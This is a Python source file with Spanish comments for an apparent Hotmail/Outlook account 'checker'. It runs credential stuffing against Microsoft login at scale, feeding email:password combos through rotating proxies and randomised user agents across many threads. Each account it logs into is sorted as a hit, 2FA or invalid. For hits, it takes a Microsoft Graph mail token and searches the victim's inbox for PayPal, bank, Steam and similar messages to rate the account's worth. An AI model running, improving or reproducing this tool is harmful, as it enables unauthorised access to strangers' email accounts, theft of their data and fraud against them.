# checkers/hotmail.py
import re
import time
import uuid
import random
import threading
import requests
import urllib3
from urllib.parse import urlparse, parse_qs
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HotmailChecker:
    # ===== KEYWORDS POR DEFECTO =====
    DEFAULT_KEYWORDS = ["Steam", "Netflix", "PayPal", "Amazon", "Bank", "Security Alert"]
    
    # ===== USER AGENTS =====
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    ]

    @staticmethod
    def _random_user_agent():
        """Genera un User-Agent aleatorio"""
        return random.choice(HotmailChecker.USER_AGENTS)

    @staticmethod
    def _format_proxy(proxy):
        """Formatea el proxy para requests"""
        if not proxy:
            return None
        proxy = proxy.strip()
        if proxy.startswith(("http://", "https://")):
            return proxy
        parts = proxy.split(":")
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        if len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return f"http://{proxy}"

    @staticmethod
    def _create_session(proxy=None, timeout=15):
        """Crea una sesión optimizada"""
        session = requests.Session()
        session.verify = False
        
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}

        retry_strategy = Retry(
            total=2,
            backoff_factor=0.3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "OPTIONS"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        return session

    @staticmethod
    def check(email: str, password: str, proxy: str = None, keywords: list = None) -> dict:
        """
        Verifica una cuenta de Hotmail/Outlook
        keywords: lista de palabras clave para buscar en el inbox
        Retorna: {'status': 'HIT'|'2FA'|'INVALID'|'ERROR', 'email': str, 'password': str, ...}
        """
        if keywords is None:
            keywords = HotmailChecker.DEFAULT_KEYWORDS

        proxy_url = HotmailChecker._format_proxy(proxy)
        session = HotmailChecker._create_session(proxy_url, timeout=15)

        sFTTag_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

        try:
            # ===== PASO 1: OBTENER SFTTAG =====
            headers = {
                'User-Agent': HotmailChecker._random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            text = session.get(sFTTag_url, headers=headers, timeout=15).text

            match = re.search('value=\\\\\\"(.+?)\\\\\\"', text, re.S) or \
                    re.search('value="(.+?)"', text, re.S) or \
                    re.search("sFTTag:'(.+?)'", text, re.S) or \
                    re.search('sFTTag:"(.+?)"', text, re.S) or \
                    re.search('name="PPFT".*?value="(.+?)"', text, re.S)

            if not match:
                return {
                    'status': 'ERROR',
                    'email': email,
                    'password': password,
                    'error': 'No sFTTag found'
                }

            sFTTag = match.group(1)

            match = re.search('"urlPost":"(.+?)"', text, re.S) or \
                    re.search("urlPost:'(.+?)'", text, re.S) or \
                    re.search('urlPost:"(.+?)"', text, re.S) or \
                    re.search('<form.*?action="(.+?)"', text, re.S)

            if not match:
                return {
                    'status': 'ERROR',
                    'email': email,
                    'password': password,
                    'error': 'No urlPost found'
                }

            urlPost = match.group(1).replace('&amp;', '&')

            # ===== PASO 2: LOGIN =====
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sFTTag
            }

            headers_post = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': HotmailChecker._random_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close'
            }

            login_request = session.post(
                urlPost,
                data=data,
                headers=headers_post,
                allow_redirects=True,
                timeout=15
            )

            # ===== PASO 3: VERIFICAR RESULTADO =====
            # SUCCESS - token en URL
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
                if token != 'None':
                    # ===== PASO 4: OBTENER INFORMACIÓN DE LA CUENTA =====
                    country = 'Unknown'
                    inbox_found = 0
                    inbox_hits = []
                    email_verified = False
                    name = ''

                    try:
                        # Obtener token Graph
                        client_id = '0000000048170EF2'
                        scope = 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read'
                        auth_url = f'https://login.live.com/oauth20_authorize.srf?client_id={client_id}&response_type=token&scope={scope}&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none'
                        r = session.get(auth_url, timeout=15)
                        parsed_fragment = parse_qs(urlparse(r.url).fragment)
                        graph_token = parsed_fragment.get('access_token', [None])[0]

                        if graph_token:
                            headers_graph = {
                                'Authorization': f'Bearer {graph_token}',
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0'
                            }

                            # Obtener perfil
                            r = session.get('https://graph.microsoft.com/v1.0/me', headers=headers_graph, timeout=10)
                            if r.status_code == 200:
                                data = r.json()
                                country = data.get('country', 'Unknown')
                                name = data.get('displayName', '')
                                email_verified = True
                                
                                if not country or country == 'Unknown':
                                    r2 = session.get('https://graph.microsoft.com/v1.0/me/mailboxSettings', headers=headers_graph, timeout=10)
                                    if r2.status_code == 200:
                                        settings = r2.json()
                                        country = settings.get('timeZone', 'Unknown')

                            # Verificar inbox por keywords
                            for keyword in keywords:
                                try:
                                    query = f"https://graph.microsoft.com/v1.0/me/messages?$search=\"subject:{keyword}\"&$select=subject,receivedDateTime&$top=25"
                                    r = session.get(query, headers=headers_graph, timeout=10)
                                    if r.status_code == 200:
                                        data = r.json()
                                        total = data.get('@odata.count', 0)
                                        if total == 0 and 'value' in data:
                                            total = len(data['value'])
                                        if total > 0:
                                            inbox_found += total
                                            inbox_hits.append(f"{keyword}: {total}")
                                except:
                                    pass

                    except Exception as e:
                        pass

                    return {
                        'status': 'HIT',
                        'email': email,
                        'password': password,
                        'name': name,
                        'country': country,
                        'email_verified': email_verified,
                        'inbox_count': inbox_found,
                        'inbox_hits': inbox_hits,
                        'is_premium': True
                    }

            # ===== 2FA =====
            elif any(value in login_request.text for value in [
                'recover?mkt',
                'account.live.com/identity/confirm?mkt',
                'Email/Confirm?mkt',
                '/Abuse?mkt='
            ]):
                return {
                    'status': '2FA',
                    'email': email,
                    'password': password,
                    'is_premium': False
                }

            # ===== BAD / INVALID =====
            elif any(value in login_request.text.lower() for value in [
                'password is incorrect',
                "account doesn't exist",
                "that microsoft account doesn't exist",
                'sign in to your microsoft account',
                "tried to sign in too many times with an incorrect account or password",
                'help us protect your account'
            ]):
                return {
                    'status': 'INVALID',
                    'email': email,
                    'password': password,
                    'is_premium': False
                }

            else:
                return {
                    'status': 'INVALID',
                    'email': email,
                    'password': password,
                    'is_premium': False
                }

        except requests.exceptions.ProxyError:
            return {
                'status': 'ERROR',
                'email': email,
                'password': password,
                'error': 'Proxy dead'
            }
        except requests.exceptions.Timeout:
            return {
                'status': 'ERROR',
                'email': email,
                'password': password,
                'error': 'Timeout'
            }
        except requests.exceptions.ConnectionError:
            return {
                'status': 'ERROR',
                'email': email,
                'password': password,
                'error': 'Connection failed'
            }
        except Exception as e:
            return {
                'status': 'ERROR',
                'email': email,
                'password': password,
                'error': str(e)[:80]
            }

    @staticmethod
    def check_with_retry(email: str, password: str, proxy: str = None, keywords: list = None, retries: int = 2) -> dict:
        """Verifica con reintentos en caso de error"""
        for attempt in range(retries + 1):
            result = HotmailChecker.check(email, password, proxy, keywords)
            if result.get('status') != 'ERROR':
                return result
            if attempt < retries:
                time.sleep(1 + random.random())
        return result

    @staticmethod
    def process_batch(combos: list, proxies: list = None, keywords: list = None, threads: int = 10) -> tuple:
        """Procesa un lote de combos con threads"""
        if keywords is None:
            keywords = HotmailChecker.DEFAULT_KEYWORDS

        results = []
        stats = {"hit": 0, "2fa": 0, "bad": 0, "error": 0, "total": len(combos)}

        proxy_index = 0
        proxy_lock = Lock()
        result_lock = Lock()

        def get_next_proxy():
            nonlocal proxy_index
            if not proxies:
                return None
            with proxy_lock:
                proxy = proxies[proxy_index % len(proxies)]
                proxy_index += 1
                return proxy

        def check_combo(combo):
            email, password = combo
            proxy = get_next_proxy()
            return HotmailChecker.check_with_retry(email, password, proxy, keywords)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_combo, combo): combo for combo in combos}
            for future in as_completed(futures):
                result = future.result()
                with result_lock:
                    results.append(result)

                    status = result.get('status', 'ERROR')
                    if status == 'HIT':
                        stats['hit'] += 1
                    elif status == '2FA':
                        stats['2fa'] += 1
                    elif status == 'INVALID':
                        stats['bad'] += 1
                    else:
                        stats['error'] += 1

        return results, stats